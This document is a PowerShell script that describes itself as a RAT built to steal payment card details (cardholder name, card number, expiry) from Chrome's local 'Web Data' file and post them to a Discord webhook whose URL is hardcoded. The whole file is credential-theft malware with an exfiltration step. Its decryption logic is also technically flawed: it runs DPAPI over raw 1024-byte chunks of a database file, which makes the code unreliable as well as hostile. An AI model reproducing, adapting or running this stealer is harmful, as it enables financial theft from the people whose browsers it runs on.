# PowerShell RAT to Steal Payment Information from Chrome and Send to Discord Webhook

# Define the webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1453518648726523996/Uv-gp_SmhlEYcCARWsxAfkb3ZmTw_d_HsXgo9SLMtDfJ9da4c9YlhpxYEdsiTaRTHiOA"

# Load necessary .NET assemblies
Add-Type -AssemblyName "System.Security"

# Function to decrypt Chrome payment information
function Decrypt-ChromePaymentInfo {
    param (
        [byte[]]$encryptedData
    )
    $dataProtector = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    return [System.Text.Encoding]::UTF8.GetString($dataProtector)
}

# Function to get Chrome payment information
function Get-ChromePaymentInfo {
    $profilePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
    $webDataFile = Join-Path -Path $profilePath -ChildPath "Web Data"
    if (Test-Path $webDataFile) {
        $webDataContent = Get-Content -Path $webDataFile -Encoding Byte
        $paymentInfo = @()
        for ($i = 0; $i -lt $webDataContent.Length; $i += 1024) {
            $chunk = $webDataContent[$i..($i + 1023)]
            $decryptedChunk = Decrypt-ChromePaymentInfo -encryptedData $chunk
            if ($decryptedChunk -match "name_on_card") {
                $lines = $decryptedChunk -split "`n"
                $paymentInfo += [PSCustomObject]@{
                    Name       = $lines[0].Split("`t")[1].Trim()
                    CardNumber = $lines[1].Split("`t")[1].Trim()
                    Expiry     = $lines[2].Split("`t")[1].Trim()
                }
            }
        }
        return $paymentInfo
    }
}

# Function to send data to Discord Webhook
function Send-DiscordMessage {
    param (
        $message
    )
    $body = @{
        content = $message
    } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
    } catch {
        Write-Error "Failed to send message to Discord: $_"
    }
}

# Retrieve and prepare payment information
$chromePaymentInfo = Get-ChromePaymentInfo

# Create message to send
$message = "Chrome Payment Information Dump:`n`n"

if ($chromePaymentInfo) {
    $message += "Payment Information:`n"
    $message += $chromePaymentInfo | Format-Table -AutoSize | Out-String
}

# Send the message to Discord
Send-DiscordMessage -message $message

# Clean up
Remove-Variable chromePaymentInfo, message
